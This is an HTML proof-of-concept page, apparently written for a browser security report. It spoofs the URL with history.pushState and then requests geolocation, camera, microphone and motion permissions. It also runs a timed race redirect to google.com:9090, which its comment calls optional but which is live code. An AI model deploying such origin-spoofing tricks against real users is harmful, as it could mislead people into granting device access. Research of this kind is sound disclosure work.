<!doctype html>
<html>
<head>
<meta charset="utf-8">
<title>Permission Origin Test</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>

<body>

<button id="start">
Start PoC
</button>

<hr>

<button onclick="geo()">Geolocation</button>
<button onclick="camera()">Camera</button>
<button onclick="mic()">Microphone</button>
<button onclick="motion()">Motion</button>
<button onclick="orientation()">Orientation</button>

<p id="url"></p>
<p id="result">Result:</p>


<script>

const result = document.getElementById("result");


function show(x){
    result.innerHTML = x;
}


/*
 STEP 1
 same origin state change
*/

document.getElementById("start").onclick = ()=>{

    history.pushState(
        {},
        "",
        "/trusted"
    );

    document.getElementById("url").innerHTML =
        location.href;

};



/*
 GEOLOCATION
*/

function geo(){

    navigator.geolocation.getCurrentPosition(

        pos=>{

            show(
                "Geo OK<br>" +
                pos.coords.latitude +
                "<br>" +
                pos.coords.longitude
            );

        },

        err=>{

            show(
                "Geo error: " +
                err.message
            );

        }

    );

}



/*
 CAMERA
*/

async function camera(){

    try{

        let stream =
        await navigator.mediaDevices.getUserMedia({
            video:true
        });


        show("Camera OK");


        stream.getTracks()
        .forEach(t=>t.stop());


    }catch(e){

        show(
            "Camera error: " + e.message
        );

    }

}



/*
 MICROPHONE
*/

async function mic(){

    try{

        let stream =
        await navigator.mediaDevices.getUserMedia({
            audio:true
        });


        show("Mic OK");


        stream.getTracks()
        .forEach(t=>t.stop());


    }catch(e){

        show(
            "Mic error: " + e.message
        );

    }

}



/*
 MOTION
*/

async function motion(){

    try{

        if(DeviceMotionEvent.requestPermission){

            let r =
            await DeviceMotionEvent.requestPermission();

            show(
                "Motion: " + r
            );

        }else{

            show(
                "Motion unavailable"
            );

        }


    }catch(e){

        show(
            "Motion error: " + e.message
        );

    }

}



/*
 ORIENTATION
*/

async function orientation(){

    try{

        if(DeviceOrientationEvent.requestPermission){

            let r =
            await DeviceOrientationEvent.requestPermission();

            show(
                "Orientation: " + r
            );

        }else{

            show(
                "Orientation unavailable"
            );

        }


    }catch(e){

        show(
            "Orientation error: " + e.message
        );

    }

}



/*
 OPTIONAL RACE TEST
*/

window.addEventListener(
"pageshow",
()=>{

    requestAnimationFrame(()=>{

        requestAnimationFrame(()=>{

            setTimeout(()=>{

                // aktifkan jika ingin test race

                  location.href =
                 "https://google.com:9090";


            },80);

        });

    });

});


</script>

</body>
</html>
